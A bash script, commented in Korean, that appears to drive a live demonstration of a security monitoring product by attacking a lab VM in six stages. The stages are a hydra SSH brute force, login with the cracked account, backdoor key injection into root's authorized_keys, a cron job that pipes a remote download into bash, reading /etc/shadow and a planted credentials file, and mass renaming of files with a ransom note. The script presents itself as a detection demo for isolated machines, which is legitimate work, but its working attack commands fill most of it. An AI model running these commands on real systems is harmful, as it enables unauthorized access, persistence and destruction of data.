#!/usr/bin/env bash
# =============================================================================
#  InfraRed 라이브 데모 — 공격자 VM 스크립트
# -----------------------------------------------------------------------------
#  실행 위치 : 공격자 VM (타깃과 "다른 머신"). Kali 또는 Ubuntu + hydra/sshpass
#  사용법    : ./attack.sh <타깃IP> [stage]
#                ./attack.sh 192.168.56.20          → 전 단계를 차례로 (각 단계 Enter)
#                ./attack.sh 192.168.56.20 1        → 1단계만 실행
#  단계      : 1 브루트포스 / 2 침투 / 3 지속성 / 4 정찰+미끼 / 5 랜섬웨어 / 6 차단확인
#
#  ⚠️  본인 소유의 격리망 타깃 VM 전용. "랜섬웨어"는 폐기 폴더 파일을 .locked로
#      바꾸는 양성(되돌릴 수 있는) 시뮬레이션이며 실제 암호화를 하지 않습니다.
# =============================================================================
set -uo pipefail

TARGET="${1:?사용법: ./attack.sh <타깃IP> [stage]}"
STAGE="${2:-all}"

# ── 통제된 파라미터 (target_setup.sh와 일치해야 함) ──────────────────────────
VICTIM_USER="deploy"
VICTIM_PASS="Summer2024"      # 워드리스트에 심을 "정답" (자동 크랙 보장)
ROOT_USER="root"
ROOT_PASS="Passw0rd!"
LOOT_DIR="/home/${VICTIM_USER}/important_docs"
WORDLIST="/tmp/ir_wordlist.txt"
ATTACKER_TAG="INFRARED-DEMO-ATTACKER"

C_R="\033[1;31m"; C_G="\033[1;32m"; C_Y="\033[1;33m"; C_C="\033[1;36m"; C_0="\033[0m"
banner() { echo -e "\n${C_R}══════════════════════════════════════════════════════════════${C_0}"; \
           echo -e "${C_R}  $*${C_0}"; \
           echo -e "${C_R}══════════════════════════════════════════════════════════════${C_0}"; }
narrate(){ echo -e "${C_C}» $*${C_0}"; }
ok()     { echo -e "${C_G}[✓] $*${C_0}"; }
pause()  { [ "$STAGE" = "all" ] && { echo; read -rp $'\033[1;33m[Enter] 다음 단계로...\033[0m' _; }; }

need() { command -v "$1" >/dev/null 2>&1 || { echo -e "${C_Y}[!] '$1' 설치 필요: sudo apt install -y $2${C_0}"; MISSING=1; }; }
MISSING=0; need hydra hydra; need sshpass sshpass; need ssh openssh-client
[ "$MISSING" = "1" ] && exit 1

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o LogLevel=ERROR"
rsh() { sshpass -p "$2" ssh $SSH_OPTS "$1@${TARGET}" "$3"; }   # rsh <user> <pass> "<cmd>"

# ── 워드리스트: 흔한 비번 + 정답을 8번째에 심어 ~30초 내 확정 크랙 ───────────
build_wordlist() {
  cat > "$WORDLIST" <<EOF
123456
password
admin
qwerty
letmein
root
welcome
${VICTIM_PASS}
iloveyou
dragon
EOF
}

# ── 1. 정찰 + SSH 브루트포스 (AUTH-001 / AUTH-003 / AUTH-004) ────────────────
stage1() {
  banner "STAGE 1 — 정찰 & SSH 브루트포스  (MITRE T1110.001)"
  narrate "공격자 머신($(hostname -I | awk '{print $1}'))에서 타깃 ${TARGET} 의 SSH를 무차별 대입합니다."
  build_wordlist
  narrate "워드리스트 ${WORDLIST} 로 hydra 공격 시작..."
  hydra -l "$VICTIM_USER" -P "$WORDLIST" -t 4 -f -I "ssh://${TARGET}" 2>/dev/null \
    | tee /tmp/ir_hydra.out || true
  if grep -q "password:" /tmp/ir_hydra.out; then
    ok "자격증명 탈취 성공 → ${VICTIM_USER} / ${VICTIM_PASS}"
    narrate "InfraRed 대시보드: AUTH-001(브루트포스) → AUTH-004(실패 후 성공) 시그널 확인"
  else
    echo -e "${C_Y}[!] hydra가 비번을 못 찾았으면 타깃 sshd/계정을 확인하세요.${C_0}"
  fi
}

# ── 2. 침투: 탈취 계정으로 로그인 + root 권한 확보 ───────────────────────────
stage2() {
  banner "STAGE 2 — 침투 (Initial Access, T1078)"
  narrate "탈취한 ${VICTIM_USER} 계정으로 실제 SSH 접속, 시스템 정보 수집..."
  rsh "$VICTIM_USER" "$VICTIM_PASS" "id; hostname; uname -a"
  ok "유효 계정으로 셸 획득"
}

# ── 3. 지속성 확보 (PERSIST-001 authorized_keys / PERSIST-002 cron) ──────────
stage3() {
  banner "STAGE 3 — 지속성 확보 (Persistence, T1098 / T1053)"
  narrate "에이전트가 감시하는 /root/.ssh/authorized_keys 에 백도어 키 주입..."
  # 데모용 더미 공개키 (태그 포함 → reset에서 제거)
  local KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID3m0d3m0d3m0d3m0d3m0d3m0attacker ${ATTACKER_TAG}"
  rsh "$ROOT_USER" "$ROOT_PASS" "mkdir -p /root/.ssh && echo '${KEY}' >> /root/.ssh/authorized_keys"
  ok "authorized_keys 변조 → PERSIST-001 (T1098.004)"
  narrate "cron 백도어 등록 (/etc/cron.d)..."
  rsh "$ROOT_USER" "$ROOT_PASS" "echo '*/5 * * * * root curl -s http://${TARGET}:4444/x|bash # ${ATTACKER_TAG}' > /etc/cron.d/infrared-demo-backdoor"
  ok "cron 변조 → PERSIST-002 (T1053.003)"
  echo -e "${C_Y}>>> 이 시점에서 attack_chain 엔진이 1~3단계를 묶어 CRITICAL 시나리오로 승격합니다 <<<${C_0}"
}

# ── 4. 정찰 + 미끼(허니토큰) 작동 (ESCALATE-001 / Deception) ─────────────────
stage4() {
  banner "STAGE 4 — 자격증명 탈취 시도 & 미끼 작동 (T1552 / T1083)"
  narrate "민감 파일 열람..."
  rsh "$ROOT_USER" "$ROOT_PASS" "cat /etc/passwd | tail -3; cat /etc/shadow | head -1"
  narrate "공격자가 '클라우드 키'를 찾다가 미끼 자격증명을 건드립니다..."
  rsh "$VICTIM_USER" "$VICTIM_PASS" "cat /home/${VICTIM_USER}/.aws/credentials"
  ok "허니토큰 접근 감지 → Deception 경보 (높은 정밀도, 오탐 거의 0)"
}

# ── 5. 랜섬웨어 (양성 시뮬레이션) (EXEC-001 /tmp / EXEC-003 대량변조) ─────────
stage5() {
  banner "STAGE 5 — 랜섬웨어 행위 (Impact, T1486)"
  narrate "/tmp 에 페이로드를 떨구고 실행 (에이전트 TmpExecutionMonitor → EXEC-001)..."
  rsh "$ROOT_USER" "$ROOT_PASS" "printf '#!/bin/sh\necho running\nsleep 2\n' > /tmp/update_helper && chmod +x /tmp/update_helper && /tmp/update_helper &"
  narrate "폐기 폴더의 문서 150개를 .locked 로 대량 변조 + 랜섬노트 생성 (EXEC-003)..."
  rsh "$ROOT_USER" "$ROOT_PASS" "cd ${LOOT_DIR} && for f in *.docx; do mv \"\$f\" \"\$f.locked\"; done; echo 'Your files are encrypted. Send 1 BTC.' > README_DECRYPT.txt"
  ok "대량 파일 변조 감지 → EXEC-003 → RANSOMWARE_PRECURSOR 시나리오"
  echo -e "${C_Y}>>> InfraRed: AI 분석 리포트 + 자동 대응(iptables 차단 + SSH 키 JIT 회수) 발동 <<<${C_0}"
}

# ── 6. 차단 확인: 공격자가 접속을 잃는 것을 증명 ─────────────────────────────
stage6() {
  banner "STAGE 6 — 자동 대응 결과 확인 (Containment)"
  narrate "공격자가 다시 명령을 시도합니다... (자동 차단이 발동했다면 실패해야 함)"
  if rsh "$ROOT_USER" "$ROOT_PASS" "echo STILL_IN" 2>/dev/null | grep -q STILL_IN; then
    echo -e "${C_Y}[!] 아직 접속됨 — 대응 정책 발동까지 수 초 더 대기 후 재시도하세요.${C_0}"
  else
    ok "접속 거부됨! InfraRed가 공격자 IP를 iptables로 차단했습니다."
    narrate "공격자 머신이 타깃에서 완전히 격리되었습니다. 데모 끝."
  fi
}

run() { case "$1" in 1) stage1;; 2) stage2;; 3) stage3;; 4) stage4;; 5) stage5;; 6) stage6;; esac; }

echo -e "${C_C}타깃: ${TARGET}  | 단계: ${STAGE}${C_0}"
if [ "$STAGE" = "all" ]; then
  for s in 1 2 3 4 5 6; do run "$s"; pause; done
  ok "전체 공격 체인 시연 완료."
else
  run "$STAGE"
fi
